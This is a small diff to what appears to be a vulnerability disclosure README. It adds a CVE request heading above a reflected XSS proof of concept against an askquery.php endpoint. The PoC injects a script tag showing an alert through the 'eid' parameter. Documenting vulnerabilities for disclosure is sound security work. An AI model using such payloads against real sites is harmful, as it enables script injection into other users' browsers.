@@ -52,7 +52,8 @@ ___
 
 # XSS
 
-Poc:
+## CVE Request 1928476:
+Poc XSS:
 - /askquery.php?eid="><script>alert("Carlos%20Tuma%20-%20Bl4dsc4n")</script>
 
 <img width="1038" height="732" alt="image" src="https://github.com/user-attachments/assets/3c33a43b-084e-4768-8b60-ca1d8712e129" />
